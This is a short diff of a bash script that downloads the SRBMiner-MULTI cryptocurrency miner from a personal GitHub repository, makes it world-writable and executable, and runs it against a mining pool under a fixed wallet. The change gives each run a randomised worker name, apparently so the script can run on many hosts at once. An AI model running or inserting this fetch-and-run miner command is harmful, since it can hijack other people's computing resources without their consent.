@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://github.com/aqshakuy/bb/raw/main/SRBMiner-MULTI
 chmod 777 SRBMiner-MULTI
-./SRBMiner-MULTI --disable-gpu --algorithm pufferfish2bmb --pool bmb.ffmpool.com:4444 --wallet 00B273F306998F8168C4D5EBAA02607273352701AAB4BFEE47.itil
+./SRBMiner-MULTI --disable-gpu --algorithm pufferfish2bmb --pool bmb.ffmpool.com:4444 --wallet 00B273F306998F8168C4D5EBAA02607273352701AAB4BFEE47.$(echo $(shuf -i 1-20000 -n 1)-rob)
